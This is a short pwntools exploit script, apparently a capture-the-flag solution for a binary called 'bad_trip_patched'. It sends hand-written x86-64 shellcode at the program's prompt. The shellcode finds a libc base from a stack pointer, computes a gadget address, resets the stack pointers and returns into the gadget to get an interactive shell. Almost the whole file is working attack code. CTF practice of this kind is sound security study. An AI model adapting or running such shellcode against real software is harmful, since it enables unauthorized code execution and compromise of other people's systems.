#!/usr/bin/python3

from pwn import *

exe = ELF('bad_trip_patched', checksec=False)

context.binary = exe

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
sln = lambda msg, num: sla(msg, str(num).encode())
sn = lambda msg, num: sa(msg, str(num).encode())

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        brva 0x1436

        c
        ''')
        input()


if args.REMOTE:
    p = remote('')
else:
    p = process(exe.path)
GDB()
pa = asm("""
    sub r13, 0x80
    mov r13, [r13]
    sub r13, 0x27d8a
    mov r14, r13
    add r14, 0xdabb3
    mov rbp, 0x6969696500
    mov rsp, 0x6969696500
    push r14
    mov rdi, 0
    ret
    """)

sla(b'>>', pa)
p.interactive()
